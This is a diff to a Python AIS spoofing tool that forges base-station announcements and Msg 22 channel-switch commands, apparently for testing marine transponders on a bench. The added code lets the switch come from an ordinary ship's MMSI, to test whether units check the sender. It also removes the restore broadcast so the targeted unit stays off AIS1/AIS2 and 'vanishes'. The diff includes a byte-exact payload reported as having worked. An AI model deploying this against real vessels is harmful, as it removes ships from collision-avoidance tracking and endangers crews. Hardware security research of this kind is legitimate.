@@ -720,27 +720,33 @@ def build_chanmgmt(ctx):
 M20_TARGET_OFFSETS = [60, 420, 810, 1170, 1525, 1870]   # bracket a slow Class A's typical slots
 
 
-def build_chanmgmt_switch(ctx, ch_a=None, ch_b=None):
+def build_chanmgmt_switch(ctx, ch_a=None, ch_b=None, src_mmsi=None):
     """EXACT replica of the sequence that vanished the unit in the first successful run: announce
-    the base as its OWN step, then send the base channel switch ALONE -- no Msg 4 in the same
-    burst, no ship command first, and (when run without --clear-region) no position jumping. With
-    the default target (2084/2085) the transmitted Msg 22 is byte-identical to the one that worked
-    (verified: payload F03Owsj2B2D6f5QUVeGO31m1P000). Pass ch_a/ch_b to retune to a different
-    target -- e.g. an out-of-AIS-band marine channel (2001 ~156 MHz) or an invalid value (0, 4095)
-    -- to test whether the unit clamps the channel field or emits AIS outside the AIS band. Run on
-    a CLEAN unit (front-panel factory reset if it already holds a region; NOT --clear-region). The
-    unit applies only the FIRST Msg 22 per clean state, so test ONE target per run."""
+    the base as its OWN step, then send the channel switch ALONE -- no Msg 4 in the same burst, no
+    second command, and (when run without --clear-region) no position jumping. With the default
+    base source and target (2084/2085) the transmitted Msg 22 is byte-identical to the one that
+    worked (verified: payload F03Owsj2B2D6f5QUVeGO31m1P000). Pass ch_a/ch_b to retune to a different
+    target (out-of-band 2001, invalid 0/4095) to test channel-field clamping. Pass src_mmsi to send
+    the command from an ordinary ship instead of the base, which tests source authority: a base is
+    still announced, but the switch comes from a regular MMSI, so acting on it means the unit does
+    not check the sender. Run each source and target on a CLEAN unit (front-panel factory reset if
+    it holds a region; NOT --clear-region), one per run, since only the first Msg 22 per clean state
+    takes effect."""
     ch_a = ALT_CH_A if ch_a is None else ch_a
     ch_b = ALT_CH_B if ch_b is None else ch_b
+    src = BASE_MMSI if src_mmsi is None else src_mmsi
+    is_ship = src != BASE_MMSI
+    label = "ordinary ship" if is_ship else "base"
+    name = "cm_m22_ship_altchan" if is_ship else "cm_m22_base_altchan"
     vlat, vlon = ctx.victim_lat, ctx.victim_lon
     return [
         ("cm_announce_base",
             [(enc.encode_type4(BASE_MMSI, vlat + 0.2, vlon + 0.2, hour=12, minute=0, second=0),
               "Msg4 base-station announcement")]),
-        ("cm_m22_base_altchan",
-            [(_m22_regional(BASE_MMSI, vlat, vlon, ch_a, ch_b),
-              f"M22 (base) regional switch to {ch_a}/{ch_b} -- expect victim leaves AIS1/AIS2 "
-              f"(check serial ACA for the applied channel)")]),
+        (name,
+            [(_m22_regional(src, vlat, vlon, ch_a, ch_b),
+              f"M22 ({label}) regional switch to {ch_a}/{ch_b} -- unit leaves AIS1/AIS2 only if it "
+              f"acts on this source (check serial ACA)")]),
     ]
 
 
@@ -1036,6 +1042,10 @@ def main():
                          "--chanmgmt-switch-only. ONE target per clean run; check the serial ACA.")
     ap.add_argument("--switch-ch-b", type=int, default=None,
                     help="override the channel-switch target channel B (default 2085)")
+    ap.add_argument("--switch-src", choices=["base", "regular"], default="base",
+                    help="source of the channel switch: 'base' (default, the proven attack) or "
+                         "'regular' (an ordinary ship) to test M22 source authority. Run each from a "
+                         "CLEAN state (factory reset between): only the first M22 per clean state takes.")
     ap.add_argument("--chanmgmt-gentle", action="store_true",
                     help="run ONLY the non-channel base-station commands (M16 rate, M20 slots, M23 "
                          "group), base then ship, in one clean pass -- no channel change, no "
@@ -1329,7 +1339,8 @@ def main():
 
         # ---- channel-management / base-authority suite (--chanmgmt or --chanmgmt-only) ----
         if args.chanmgmt or args.chanmgmt_only or args.chanmgmt_switch_only:
-            cm = (build_chanmgmt_switch(ctx, args.switch_ch_a, args.switch_ch_b)
+            _switch_src = REGULAR_MMSI if args.switch_src == "regular" else BASE_MMSI
+            cm = (build_chanmgmt_switch(ctx, args.switch_ch_a, args.switch_ch_b, _switch_src)
                   if args.chanmgmt_switch_only else build_chanmgmt(ctx))
             if args.chanmgmt_no_switch and not args.chanmgmt_switch_only:
                 # drop the channel-switch cells; keep everything the unit self-recovers from, so a
@@ -1370,12 +1381,20 @@ def main():
             # final safety recovery: force the region back to the default channels several times.
             # NOTE: this goes out the simulator's single fixed channel, so if the unit already moved
             # it will NOT hear this -- that is the demonstrated recovery trap, not a bug.
-            print("    final recovery: restoring default AIS channels + high power for the region")
-            for _ in range(3):
-                ws.send(_m22_regional(BASE_MMSI, ctx.victim_lat, ctx.victim_lon,
-                                      DEF_CH_A, DEF_CH_B, power=0))
-                rec(event="final_recovery", meta="restore default channels (regional M22)")
-                time.sleep(1)
+            # SKIP it for --chanmgmt-switch-only: sending a restore ~8 s after the switch races the
+            # unit's retune, and a slower unit (em-trak) gets the restore while still on AIS1/AIS2 and
+            # never leaves, hiding the vanish. For the switch test we want the unit to stay moved so
+            # the vanish is observable; recover it afterward from the front panel or --chanmgmt-recover.
+            if not args.chanmgmt_switch_only:
+                print("    final recovery: restoring default AIS channels + high power for the region")
+                for _ in range(3):
+                    ws.send(_m22_regional(BASE_MMSI, ctx.victim_lat, ctx.victim_lon,
+                                          DEF_CH_A, DEF_CH_B, power=0))
+                    rec(event="final_recovery", meta="restore default channels (regional M22)")
+                    time.sleep(1)
+            else:
+                print("    (switch-only: NOT sending a restore, so the vanish stays observable; "
+                      "recover from the front panel or --chanmgmt-recover afterward)")
             # POSTROLL: labelled no-injection window to check whether the victim RETURNS to
             # AIS1/AIS2 after the restore (in the furuno run it did not -> the recovery trap).
             rec(event="chanmgmt_postroll_start", seconds=args.chanmgmt_postroll)
